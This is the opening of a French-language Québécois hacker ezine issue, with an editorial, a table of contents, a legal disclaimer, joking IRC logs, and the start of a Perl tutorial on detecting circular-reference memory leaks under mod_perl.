---
title: "mindkind111"
ezine: "mindkind"
---

# mindkind111

**Ezine:** mindkind

<div className="ascii-content">

```

        *      .    ,       _________            |       \|/
     .     .    |  .       |_________|    ().   -*-     -=*=-       __ _ _ _     ___ _ __     __ _  __
  `; 	 ,    --o-- 	.  .---------.           |     , /|\       /        |   /        |   /        | 
 .   .  	|    _     |         |           |         *   .  /         |  /         |  /         | &
     .--- -- -.         .-'--- --.   |   x   )                   /___       | /___       | /___       ;
     |         '       '         |   .             .--- --- -.       |      |     |      |     |      | 
  |  '          \_____/	         |   |----.   .----|          \      ;      :     |      |     .      |
  .  |                           |   |     \  |    |       __  \     |      |     :      .     ;      :   
 ;'. |                     ;     |   |      '-'    |       \ \  '    |      ;  *  |      :   , |      .
 -.' .			         |   |             |          ' |    .      .     ;      .     .      | 
  |  |        			 .   |     	   |          | |    |      .     |      |     |      | *
     |        			 '   |             :          | |    |      '     '      ' .   '      ;  
     |         __     __         |   |         	   |          ' |  __|______|_____|______|_____|      |_ _
 (*( .        |  \___/  |        '-.-'     .-.     ;       /_/  ' |   		             __|      |__  
     |        '         '        | |       |  \    |           /  |     MiNDKiND  1 1 1     |            :
 .   |        |    *    |        : '-------'   '---;          /   |    			    '--- -- -----'
     '--------'         '--------'                 '---- ----'    |     "quand 111 rime avec τa ownz"
                           ________    -()-    .---- ----.        |                  
     .--- --- --.   .--- -|________|---.   .---'-         \    *  |________________  _______ _ __ _____ _ _ *_
     |          |  /         /   |      \  |     |     _   \   |                    
 (*) |          '-'       .------'-.     '-'     |    \ \   '      &.            8*         . . , + 
     .			  :        |             ;       '  |            -(**)-     . . .,   = 
     :     .              |        |       .     |       |  |     
     |                    ;        .             .       |  |     "Lots of people talk and few of them know"                  
     '                    |        ;             |       .  |                                 
     :                '   |        |             :    /_/   .        		 	     - Led Zeppelin.
     .                    |        :             |         /     
     |         .-.        ,        |    .-.      :        /     (*)       _
     |         |  \       |        .    |  \     |-------'               (*)- - -- -- -- - 
     '---- ----'   '--- --'        |----'   '----'                        »
                          |        | 
                          '---- ---'  .  :`                              ,_   )    :   '    ,       
  *    .---. .      .        x          ,  .- =-     `.       ,.  '  ` ,    
     ,'  /. '.       								\|/
     :    ) ;`   .      .        x          ,  .-=+=-      .       ,. ,'  ` ,  »-*-_
     ',  -  .' 					.				/|\
       '---'          
       `
      .--------- - ----------------- -- ----- ---- --- -------- ----------- ----------- - -- - -------
     : mindkind 111.  mindkind 111.  mindkind 111.  mindkind 111.  mindkind 111. mindkind 111. mindki 
     '------ - ---------- --------- - -------- -------------- - - -- - -- - ------------- - - -

	
	On vous l'annoncais il y a α peine 2 ezine, L'empire debarque. Domage pour ceux α qui 
il sagissait d'une mauvaise nouvelle, mais aujourd'hui α la lumiΦre de notre 7eme ezine, j'ai 
l'infini et trΦs immence plaisir (α en froller l'indΘcence et labus de power  trip)  de  vous 
annoncer que c'est maintenant chose faite, Θtablie,  reconnue  et  incontestΘ.  L'Empire  est 
dΘbarquer....et yavais pas un chat sur la plage pour  nous empΦchΘ de nous installΘ (mΩme pas 
un poux), mais ne vous en faite pas, on est habituΘ. Par contre si leffort de  guerre  fut  α 
peu prΩt null (mis α part les attaques par  proxy  floodbot  d'un  crΘtin  de  francais)  les 
efforts de contruction (j'aurais bien aimer parler de reconstruction, mais comme y'avais rien 
α dΘtruire...) eux non pas ΘtΘ laissez de cotΘ, on  c'est  construit  de  beau  joujou  qu'on 
aimerait bien vous dires qu'on a, mais ca ne serais  pas  trΘs  stratΘgique  de  notre  part. 
nΘanmoin on α pas laissez nos fans et notre public en reste, avec la sortie d'un nouveau site 
web  plus  dynamique  et  mieux  adapter  a  nos besoins (et on vous prΘpare pour bientot une 
version 3.5 eye  candy  ainsi qu'un update majeure du contenu). Site web qui d'ailleur est un 
succΦs si on considΘre  l'augmentation de 75% du nombre de visites quotidienne (il est fort a 
parier que le nombre de visites dΘpassera bientot la barre des 50000). 


	Vous  l'attendiez  depuis le mois de fΘvrier. FidΦle α notre habitude on vous a faite 
poirroter  2  3  mois supplΘmentaire avant de vous le donner. Mais vous lavez maintenant sous 
vos yeux, Mindkind 111 also know as : Mindkind ca owns. Une  brique de 25 articles (ecrit par
20 auteurs diffΘrents ;]),  pour  une  totalitΘ  de  500k.  Qui  en  fait l e plus gros ezine 
francophone a voir le jour depuis  1993.  Un  tel fait d'arme aura ΘtΘ rendu possible grace α 
la crΘation de la fΘdΘration  hack.fr  qui  a  consolidΘ  l'union d es troupes quΘbΘcoise (la 
premiΦre Θtape de ce rassemblement  en  unifiant  en  2000   les  restants  de  iga,  nvrsee, 
underdark et pyrofreak sous la banniΦre de mindkind) et  α  nous donnΘ une voie en france via 
le support  du  groupe  hackever.  Le  nouveau  Pyrofreak (patoff, mulder, nuclear (lancien = 
neuro, endrix, tekrebel et kevorkian))  ainsi  que  hackever  (un  groupe  francais)   auront  
participer  α  l'Θlaboration de se ezine, ainsi que de nombreux indΘpendant  de  passage  sur  
#hack.fr  pour  porter  la  participation  des  non membres de  mindkind  α  plus  de  1/3 du 
ezine.  Un  record jusqu'ici, dΘmentissant tout argumant disant que  mindkind  est  un groupe 
fermΘ dΘdiΘ α la recherche du pouvoir. DΘsolΘ mais on s'empΦchera pas d'avancer pour ceux qui 
on peur  du  changement.
	

	Avant de vous laissez au topic qui va vous dΘmontrΘ pourquoi  mindkind,  ca  ownz  je 
dois avertir tout les polititiens, comptables, agent constabulaire, police de  carton,  agent 
du fbi, de la cia, du scrs, du mi6, pompier, gardienne de garderie a 5$,  joueur  de  hockey, 
chauffeurs   de  taxis  importΘ,  vendeurs  de  souvlaki,  infirmiΦres  naives,  porteurs  et 
porteuses  de  collant,  mangeurs  de  gras  trance,  danseuses de baladi, ovni, doublures de 
r2d2, worshipeurs de  rael,  buveurs  d'eau pΘrrier, amateurs de zeste de citron, conducteurs 
de pΘpine, critiques autodidactes, fidΦle de bΘnΘdict  XVI,  brasseurs  de jello, va nu pied, 
ptit gros dla classe, ou tout Ωtre qui est considΘrΘ α tord ou α  raison  comme  un  osti  de 
fuckΘ, et bien ce ezine n'est pas faite pour vous et la  lecture  pourrais  vous  causez  des 
douleurs intense α l'arriere du crane et dans le millieu du genoux gauche. 


et Si certain propos de ce magazine vous offences, ben, c'est plate mais c'est ca!
	


 _______________________   ,    .  , _ +__ ,   .    ;  .x  ________________________
 \ ____________________\\`__________| |/ /______________  /                      |\\  ;  .  , `  .
 ,\\_///__ //_ /// / _/ \\\   |\  /||   /    / | / | / |\'\                      | \\     +    ;
. / ////_///__/// / /__  \\\  | \/ ||  \  __ | | | | | | \ \                     | {\\ `  : .      `
 / ///___///  // /_____\  \\\ ||\/|||   \ ~~ | | | | | |  \`\                    | {}\\     x   ' .
/ //   from the stars  ____/ \||  |||_|\_\ __|_|_|_|_|_|___\ \__________________ | {} \\ `     '   
\//     _______________/   .  \|  ||  ____/ '   . \  {}  /   `\  {}  / ,  :  `  \| {} |/   | `   X,
`\_   _/ .    . x   '   `    ; \_ ||_/,  `    +    | {} | . +  | {} |   x   .  + | {} | . -+-  .
   \_ \  X :`  ,  '   ; +  .  , / _/ ,  x. ` ,  ` ;|\()/|     :|\()/| +  . ,     |\()/|    |  ,   ;
 `  '\\_`_____________________ _//_______   ____ _  \||/ ' | ,  \||/___ _______`_ \||/   .           
' ;  \_ |[O1] un affaire de lemurien                 ||  -=+=-   ||      C4-       ||  x     . :     
  . '  \|[O2] une 6eme affaire de perl               ||  . | , ` ||   Nothing94   [__]     `       . 
,    .  |[O3] un affaire de nas                     [__]~~~~~~~~[__]   Nexact      ||  ,`.  ; '      
  .--,  |[O4] Un affaire d'ergonomie software        ||   +   .  ||      h3       [__]      x   +    
.`( ).',|[O5] Un affaire de thread                  [__]~~~~~~~~[__]   Phawnky     || ` ,      .  ,  
:'`  =':|[O6] Un affaire de spying                   ||  ,  . '  ||    Mr_Peuch   [__]   _(╓)_       
`.'= ".'|[O7] un affaire de routing                 [__]~~~~~~~~[__]   Wyzeman     ||  ((OVNII)) x   
` `--`  |[O8] un affaire de shellexecute             ||   ;  x"  ||     Waxaw     [__]  ``---''      
   x '  |[O9] Un affaire de fake-bnc                [__]~~~~~~~~[__]   Phawnky     || . `     `    , 
 ,    . |[1O] Un affaire de philosophie              ||   ' ` ,  ||    Qwzykx     [__]        .      
    ;   |[11] Un affaire de javascript              [__]~~~~~~~~[__]  Liondejuda   ||  + : `  .;'``' 
 . +   .|[12] un affaire de reverse shell            || . X` ,'  ||      __2      [__]       ;` ;`;  
        |[13] un affaire de sΘcuritΘ irc            [__]~~~~~~~~[__]    Ninja      ||  ,   ;'   `\ ' 
   "  , |[14] un affaire de cops                     ||  .  ' +  ||    Wyzeman    [__]   .'   +,     
    |   |[15] un affaire de modem adsl              [__]~~~~~~~~[__]   Nuclear     ||   .;  |  /``   
 . \|/  |[16] un affaire de trojan                   ||   ;   .  ||    FlUxIuS    [__] .; .'`.;  `   
 --=+=--|[17] un affaire de cryptographie           [__]~~~~~~~~[__]   Steck       ||  : / .  `      
`  /|\ `|[18] un affaire de bot irc scriptable php   || .  x' `  ||    Wyzeman    [__] :\|   '`      
    |   |[19] un affaire d'esploration urbaine      [__]~~~~~~~~[__]     vn        ||  `;.`'\.     :'
 ` ;  ' |[2O] un affaire de ntfs                     ||  . '  ,  ||    FlUxIuS    [__]. `.  / `;    ;
,   .   |[21] un affaire d'antenne qui tourne       [__]~~~~~~~~[__]    n0p        ||    `;   .      
  '   : |[22] un affaire de google                   ||   .  '   ||    loytie     [__]  '  ; ;       
 .   '  |[23] un affaire de password                [__]~~~~~~~~[__]  Lastcall_    ||  +   `:.       
  X .  _|_                                           ||    `  ;  ||               [__]    .   `;. .. 
      / | \_                                         ||  '+      ||                ||  ' :       ` ``
 '`  _// \__\___________  _________   _____  ___ _  /||\ : .    /||\ __ ______ __ /||\      x`     `
  ; / _/   x  ` `   ;    "  , + \_ \  .   :     `  |/()\|    x'|/()\|.    '   ,  |/()\| .  .  ;     ,
 , _//   ` : ,   +   . ` x .   `  \\_  , X `  + ,  | {} | ` ,  | {} |  ()  ;`    | {} |   -+-   ` '  
 _/  /____________________________\  \____________/__{}__\____/__{}__\_____ , + /| {} |\ ; `  . :  ,
|                                                                          \___/ | {} |\\  .  ,   . 
|                      _____________________        Mindkind ca ownz             | {} | \\      X. ;
 \____________________/                     \                                    | {} | //  .  ,  
                                             \___________________________________|____|_/ '       '


(ca fait tu pas star controle 2 a votre gout ?) (hein qwzykx ;])!!!



	Comme expliquer plutot, le ezine de mindkind n'est plus  leffort  d'un  seul  groupe. 
Pyrofreak y ayant participer d'un article, et le nouveau groupe francais, hackever, a fournis 
4 articles dans ce ezine. ╔tant donnΘ l'importance de leur  contribution,  nous  leurs  avons 
aussi laissez une parti de notre disclaimer afin qu'il puisse faire valoir leur droit :


             0001001000000100000001001000001000000100010000000000010
             010      __  __           __  _____                 000 
             000     / / / /___ ______/ /_|__  /   _____  ____   001  
             001    / /_/ / __ `/ ___/ //_//_ < | / / _ \/ ___/  010
             000   / __  / /_/ / /__/ ,< ___/ / |/ /  __/ /      000
             000  /_/ /_/\__,_/\___/_/|_/____/|___/\___/_/       001
             010                                                 000
             0100010001000000100001001000001001000000010000010000100
     
          http://hackever.n0ne.org

DISCLAIMER:

Tous  ce  qui  est contenue sur ce site est la pour information, distraction, et pour  rendre 
compte des dangΘs d'un systΦme mal configurΘ .

L'Θquipe  de  hackever  et  son  hebergeur  ne  sont  en  aucun  cas rΘsponsbles des actes ou 
agissements  quel  qu'en  soit  la  sorte, qui pourraient survenir aprΘs la lecture  des  ses 
articles, de sont forum et son chan irc.

L'article 323-1 du Code PΘnal Franτais RΘprime les intrusions et le maintient dans  un sytΦme 
informatique .

ConformΘment α l'artcile 323-3 du Code PΘnal Franτais les  pennes  requises  sont  un  an  de 
Prison et 100 000 Frs d'amende et s'il modifie les donnΘes , Les peines sont  multipliΘes par 
trois .

Hackever vous invites donc a rΘspecter la loi, si vous ne comprenez  pas  ou  n Θtes  pas  en 
accord avec ce qui est Θcrit ci-dessus ne lisez pas nos articles, notre  forum,  et  ne venez 
pas sur notres chan irc.



                                                                               hackever team.


Pour rejoindre Mindkind sur le front line :


NETWORK 	CHANNEL   	Average user

freenode 	#hack.fr  	4

recycled 	#hack.fr 	3 

undernet	#hack.fr 	66 
		#linux.fr 	36 
		#programmation 	29  

worldnet 	#hack.fr 	5   

efnet 		#hack.fr 	6  

dalnet		#programmation	9



	Bon, avant de vous laissez tranquille, je vais me payer un petit plaisir. Ca fait  un 
peu ripoff, mais d'un autre coter c'est quand meme tres actuel. Ceux  qui sont nostalgique de 
IGA risque de sourire,  jinclus ici une parti "modifier" de ma contribution au disclaimer des 
ezine IGA en 98. 


La GRC vous surveille quand :


1)  apres  la  parution de votre 7e E-zine ya une echafaudage  pour  nettoyer vos vitre alors 
    que vous demeurer au sous-sol 

2)  apres  la parution de votre 7e E-zine, Un technitien vien  verifier  votre telephone et y 
    insert un micro.

3)  apres la parution de votre 7e E-zine, Un  plombier  vient  verifier le PH de votre eau de 
    toillette.

4)  apres la parution de votre 7e E-zine, vous appercevez une caravane avec une skin de truck 
    de poubelle venir fouillez vos dechet quotidien. 

5)  apres la parution de votre 7e E-zine, binf  vous  revele  sa  reel  orientation  sexuelle 
    [so scaring]

6)  apres  la  parution  de votre 7e E-zine, le bar dans lequelle vous allez toujours veillez 
    est maintenant vide mi a par le type au lunette fumer assis dans le fond. 

7)  apres la parution de votre 7e E-zine, on construit un dunken donut a coter de chez vous. 

8)  apres la parution de votre 7e E-zine, on fait un gros champs de construction deriere chez 
    vous ou tout les travailleurs porte un skin de veston cravate.

9)  pendant le mois suivant la sortie du mindkind 110, l'ange assis sur le sapin est habiller 
    en bleu et porte une paire de menote

10) Vous servez de reference dans les conferences policiere locale sur le hacking.


avant de lire ce manuscrit quelque rΦgle de sΘcuritΘ sont a prescrire


1) nous ne somme pas responsable des maux de tΩte attrapΘ par ceux qui auront  tenter de lire 
   le  magazine  la  tΩte  α  l'envers  pour pouvoir demasquer le message secret du capitaine 
   Cypher!

2) nous ne somme pas responsable de vos defaillance cervicale. 

3) si vous utilisez une version papier du magazine, mettez des gants pour pas vous coupez les 
   doigts.

4) se magazine contient assez de gras trence, cholesterol, mercure  et  agent de conservation 
   pour tuer sur le champs un cheval qui l'aurais avaler par erreur.

5) il est recommandΘ de boire beaucoup d'eau durant la lecture de se magazine, nous ne sommes 
   pas responsable des cas de mort par dhesydratation  survenu durant une lecture inintΘrompu 
   de se magazine.  


                                                               un lecteur clonΘ en vaut deux. 

  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[O1]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[ Le Patrimoine LΘmurien        ] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka: regarde cherie c'est ca un lΘmurien                     ]=\:\    \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[      C4-     ]=\:\ _//     
                                                  \__\________________________/__/   





	Depuis le temps que vous nous demandez c'est quoi un lΘmurien et qu'on  sait pas trop 
comment vous expliquer ca. On ses donc deplacer α lΘmurland avec  nos  keylogger  et on les α 
observer dans leur habitat naturel, en voici un dans sa box. 


&lt;init_null> si a ce moment prΘsent quelqun rentre dans ma chambre
&lt;init_null> i va me trouver weird Θternelement
&lt;HolyGod> ds quel position tu es
&lt;init_null> jme fais secher les cheveux avec une grosse serviete blanche autour de ma tete
&lt;init_null> ya dla musique hindi qui joue
&lt;init_null> pis jgosse sur un afaire pour bretter de lhydrogen
&lt;c4-> cest juste un mauvais passage de ta vie
&lt;c4-> les choses vont sarranger
&lt;HolyGod> pour bretter de l'hydrogen?
&lt;init_null> haha
&lt;c4-> ;P
&lt;HolyGod> ta quel genre de "bebelle"
&lt;HolyGod> pour sa chez vs?
&lt;init_null> ca prend pas gfrand chose pour faire de lelectrolyse
&lt;Wyzeman> ca lair de prendre un sechoir a cheveux pcq ta pu lair den avoir un
&lt;init_null> heh


Les  lΘmuriens  se  rΘunisse aussi le soir pour accomplir certain rituel, nous  avons  eu  la 
chance d'en capturer quelque moment, avant de devoir senfuir,  repousser  par  une attaque de 
vieille bottes pΦchΘ prΩt de l'usine de traitement  d'eau locale (demander moi pas comment on 
a su ca ;]).

* c4--_ sings the bluez
&lt;c4--_> lala dim dim
&lt;c4--_> laa laal laa
&lt;c4--_> asti jai perdu le beat
&lt;c4--_> jme reprend 
&lt;c4--_> Annie toi tu fais la voi en background
&lt;c4--_> Wyzeman joue le solo apres le 5ieme refrain 
&lt;c4--_> pi phawnky contente toi detre sexy
&lt;c4--_> 1 2 3 
&lt;Annie> lalila uhhhh
&lt;c4--_> la la dim dim la 
&lt;c4--_> lililmlim
&lt;Annie> lalila uhhhh
&lt;Annie> hiiihooo
&lt;Wyzeman> moo moo moo mooo mooooooo meuh 
&lt;XeliteX> pwet!!!
&lt;Wyzeman> (solo
&lt;c4--_> asti cetais en plein ca 


et puis la plus par du temps un lΘmurien c'est juste quelqu'un de ben bizard.

&lt;c4--_> asti sorter les camera, on va faire la 1001ieme emission de virginie
&lt;phawnky> c4--_: rofl
&lt;Wyzeman> celle ou elle se fait de virginifier
&lt;phawnky> mature pr0n
* phawnky salive.
&lt;Wyzeman> par sont mechan docteur poillus
&lt;c4--_> qui en realiter etait son fils
&lt;c4--_> adopter et perdu la meme annee
&lt;phawnky> hahaha
&lt;Wyzeman> elever par un faux marchant de vrai esclave
&lt;Wyzeman> comme si cetais le fils de sa vache
&lt;c4--_> savourant chaque instant intime avec celle-ci
&lt;Wyzeman> comme un singe sur une corde de bois
&lt;c4--_> ha
&lt;Wyzeman> weird
&lt;c4--_> bizzard en effet
&lt;Wyzeman> c pour ca jecoute pas virginie
&lt;Wyzeman> c trop fucker pour moi


  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|                                                        \_ \   \\_  \_ \         `
 || |&lt;MADGiK> c le mindkind #7  :P                             \\_  \_ \   \\_ M  ; . X
 || |&lt;Wyzeman> de?                                             \_ \   \\_  \_ \ K      
 || |&lt;MADGiK> mindkind 111                                       \\_  \_ \   \\_ -  : '
 ||`|&lt;MADGiK> c du binaire :P                                    \_ \   \\_  \_ \ 1   
 || |&lt;MADGiK> c ca tu avais comme idΘe ?                           \\_  \_ \   \\_ 1  + 
 || |&lt;MADGiK> ce pourrait-il ?                                     \_ \   \\_  \_ \ 1   
 ||'|&lt;Wyzeman> ben                                                   \\_  \_ \   \\_  x 
 || |&lt;Wyzeman> oui                                                   \_ \   \\_  \_ \  `
 || |&lt;Wyzeman> 1 10 11 100 101 110 111                                 \\_  \_ \   \\_  
 ||,|&lt;Wyzeman> 1 2 3 4 5 6 7                                           \_ \   \\_  \_ \.
 || |&lt;MADGiK> c ca jme disais :P                                         \\_  \_ \  _\\_  
/ | |&lt;MADGiK> jvnais dcatcher                                            \_ \   \\_/    \
 / ;|                                                                      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ Bon tout le monde a compris la ?                                      ]=\:\  |
  \__\__________________________________________________________________________________/



  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[O2]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[ └ la conquΦte du chameau #6   ] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka: votre chameau souffre-t-il d'alzheimer ?                ]=\:\    \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[  Nothing94   ]=\:\ _//     
                                                  \__\________________________/__/ 


+-------------------------------------------------------------------------------------------+
| Web     : nothing94.250x.com                                                              |
| Email   : philippe.cote@usherbrooke.ca                                                    |
| Version : 1.2.0.2                                                                         |
+-------------------------------------------------------------------------------------------+

+-------------------------------------------------------------------------------------------+
| Table des matiΦres                                                                        |
+-------------------------------------------------------------------------------------------+

01 - Objectif
02 - Introduction
     * Exemple 0x0001 : RΘfΘrence circulaire
     * Exemple 0x0002 : Tie
     * Exemple 0x0003 : HΘriter de Tie::StdScalar
     * Preuve 0x0001 : Les modules Tie sont cons
03 - Ce que nous voulons
04 - Devel::Monitor
05 - Utilisation de Devel::Monitor
     * Exemple 0x0004 : Utilisation de "monitor"
     * Exemple 0x0005 : Utilisation de "monitor"
06 - Quelques problΦmes avec les constantes
07 - Outil d'insertion de moniteurs
08 - Outil de visualisation d'erreurs
     * VerifyMonitor.pl
09 - Comment rΘgler les rΘfΘrences circulaires
10 - Impossible de weaken-er un objet tied
     * Preuve 0x0002 : Test de base
     * Preuve 0x0003 : mod_perl
     * Preuve 0x0004 : Assaut final
11 - Utilisation de Devel::Monitor
     * Exemple 0x0006 : Utilisation de "print_circular_ref"
12 - Impossible d'utiliser les rΘfΘrences des objets tied
13 - Conclusion
14 - Signature
15 - Post-scriptum

+--------------------------------------------------------------------------------------------+
| Chapitre un                                                                                |
|                                                                                            |
| Objectif                                                                                   |
+--------------------------------------------------------------------------------------------+

Vous  avez un site web en Perl qui comprend beaucoup de lignes de code. Vous voulez  le faire 
rouler sur mod_perl, mais il y a des memory leaks. Vous avez donc  besoin  d'un  outil   pour 
trouver et supprimer les rΘfΘrences circulaires.

+--------------------------------------------------------------------------------------------+
| Chapitre deux                                                                              |
|                                                                                            |
| Introduction                                                                               |
+--------------------------------------------------------------------------------------------+
Bonjour groupe,

╩tes-vous en forme ? Ouuiiii
J'ai dit, ╩tes vous en forme ? OOOUuUUUiiiII

Bon, nous pouvons commencer.

Tout d'abord vous savez ce qu'est une rΘfΘrence circulaire...

+--------------------------------------------------------------------------------------------+
| Exemple 0x0001 : RΘfΘrence circulaire                                                      |
+--------------------------------------------------------------------------------------------+
1 #!/usr/bin/perl
2 use strict;
3 use warnings;
4
5 {                 #Nouveau scope
6     my $a;        #Une variable nommΘ "$a"
7     $a = \$a;     #La variable $a pointe sur la rΘfΘrence de la variable $a
8 }
+--------------------------------------------------------------------------------------------+
| EOF : Exemple 0x0001 : RΘfΘrence circulaire                                                |
+--------------------------------------------------------------------------------------------+

Lorsque  le  scope  se  termine,  Garbage et Collector ont toujours une discussion enlevante. 
Voici le log de leur conversation α la ligne 8.

&lt;Perl> Ok les gars, faites le mΘnage.
&lt;Garbage> Hey, jveux deleter $a, cte variable lα me gosse
&lt;Collector> Non caliss, ya $a qui l'utilise
&lt;Garbage> Ben on a juste α deleter cette variable lα aussi
&lt;Collector> Non caliss, ya $a qui l'utilise
&lt;Garbage> Ben on a juste α deleter cette variable lα aussi
&lt;Collector> Non caliss, ya $a qui l'utilise
&lt;Garbage> Ben on a juste α deleter cette variable lα aussi
&lt;Collector> Non caliss, ya $a qui l'utilise
&lt;Garbage> Ben on a juste α deleter cette variable lα aussi
&lt;Collector> Non caliss, ya $a qui l'utilise
&lt;Perl> Osti que vous Ωtes fatiguant, farmez vos yeules lα

Donc,  on  voit  que  Garbage et Collector n'arrivent pas α s'entendre sur la bonne  dΘcision  
α prendre. Ce qui fait que Perl, le mΘdiateur, dΘcide de les  faire  taire.  Toutefois,  α la 
ligne 9, qui est la fin du programme, Perl va puncher  sa  carte  et  s'en va boire une biΦre 
α la maison. Il n'existe donc  plus d'autoritΘ en ce bas monde donnant libre accΦs α nos deux 
travailleurs.

&lt;Garbage> Hey, Perl est parti, moi jdelete $a, lα jtannΘ
&lt;Collector> Non caliss, ya $a qui l'utilise
*** Garbage delete $a ***
&lt;Garbage> Tin, ma job est faite, jmen va moi too
&lt;Collector> Ok, on va tu boire une biΦre ?

Bon,  vous  connaissez maintenant les rΘfΘrences circulaires. Une variable n'est pas dΘtruite 
tant qu'une rΘfΘrence pointe dessus. Toutefois, si notre programme  doit rouler 24 heures sur 
24, les pertes de mΘmoire de ce genre peuvent Ωtre  fatales.  C'est  justement  le  cas  avec 
mod_perl sur apache, qui  va  conserver  en  mΘmoire le processus pour accΘlΘrer les temps de 
rΘponses au client. Nous  avons  donc  besoin  d'outils  pour dΘtecter ces pertes de mΘmoire. 
╔videmment si vous  programmez tout seul dans votre cave, vous pouvez vous arranger parce que 
vous connaissez votre code source en entier, mais si vous Ωtes une Θquipe de programmeurs, la 
tΓche peut devenir plus fastidieuse. Certaines possibilitΘs s'offrent α vous.

- Utiliser Apache::Leak pour mod_perl 1.x (mod_perl 1.99 est considΘrΘ mod_perl 2.x)
- Utiliser Devel::Peek qui ne fait pas la job dont vous avez besoin
- Utiliser Devel::Leak qui ne fait pas la job dont vous avez besoin
- Utiliser Data::Structure::Util qui fait parfois des segmentation fault en
  utilisant la fonction has_circular_ref et qui est assez incomplet

Notez Θgalement que le problΦme de ces modules perl est qu'il vous donne  des  informations α 
l'endroit  o∙  vous  mettez votre ligne de code. Donc, il  faut  dΘterminer  manuellement  la 
meilleure place o∙ positionner la validation.

Vous ne pouvez Θgalement pas utiliser valgrind (Un dΘbuggeur mΘmoire *nix)  parce  que  votre 
process doit rester en mΘmoire et  doit  donc  Ωtre  exΘcuter avec  mod_perl.  Autrement,  le 
process se termine, et perl libΦre la mΘmoire α la toute fin, ce dont vous ne voulez pas.

Cependant, il existe quelque chose de bien sympathique en Perl, que l'on appelle tie ! L'idΘe 
d'un tie, est de mettre une cravate α notre variable pour cacher  les choses indΘsirables. Un 
politicien porte toujours une cravate, pour cacher ses vrais pensΘes. En d'autre termes, tous 
les accΦs  α  la  variable  vont  passer  par  la cravate. Cette cravate peut donc dΘcider ce 
qu'elle fait de la requΩte.

+---------------------------------------------------------------------------------------------+
| Exemple 0x0002 : Tie                                                                        |
+---------------------------------------------------------------------------------------------+
1  #!/usr/bin/perl
2  use strict;
3  use warnings;
4
5  {
6      my $a;                    #Une variable nommΘ "$a"
7      tie $a, 'Tie::StdScalar'; #On pose une cravate de type scalaire standard
8      $a = 'something';         #La mΘthode standard STORE va Ωtre appelΘe
9                                #et celle ci va dΘcider de ce qu'elle fait.
10                               #Elle pourrait par exemple dΘcider d'effectuer
11                               #l'affectation tel qu'espΘrΘe, ou bien
12                               #empΩcher l'affectation en prΘtendant que la
13                               #variable est read-only. Ceci Θtant aux
14                               #besoins du programmeur.
15 }   #$a est dΘtruite ici, donc la mΘthode standard DESTROY va Ωtre appelΘe.
16     #Encore une fois, nous pouvons faire ce que nous voulons.
+---------------------------------------------------------------------------------------------+
| EOF : Exemple 0x0002 : Tie                                                                  |
+---------------------------------------------------------------------------------------------+

Nous voyons que le tie nous permet d'englobber une variable et de faire ce que  nous  voulons 
avec les transactions effectuΘes. Dans notre cas, nous avons  besoin  de  savoir lorsque   la 
variable est dΘtruite (DESTROY). Donc nous pouvons imprimer  un beau message disant que notre 
variable est dΘtruite. Pour ce faire, nous  pouvons hΘriter de l'objet Tie::StdScalar de base 
comme ceci.

+---------------------------------------------------------------------------------------------+
| Exemple 0x0003 : HΘriter de Tie::StdScalar                                                  |
+---------------------------------------------------------------------------------------------+
package TestScalar;
use Tie::Scalar;
use base 'Tie::StdScalar';

sub DESTROY {
    print STDERR "TestScalar::DESTROY : $_[0]\n"; #Imprime l'objet dΘtruit
}
+---------------------------------------------------------------------------------------------+
| EOF : Exemple 0x0003 : HΘriter de Tie::StdScalar                                            |
+---------------------------------------------------------------------------------------------+

Cependant, cet exemple va imprimer des choses comme :
TestScalar::DESTROY : SCALAR(0x12345678)



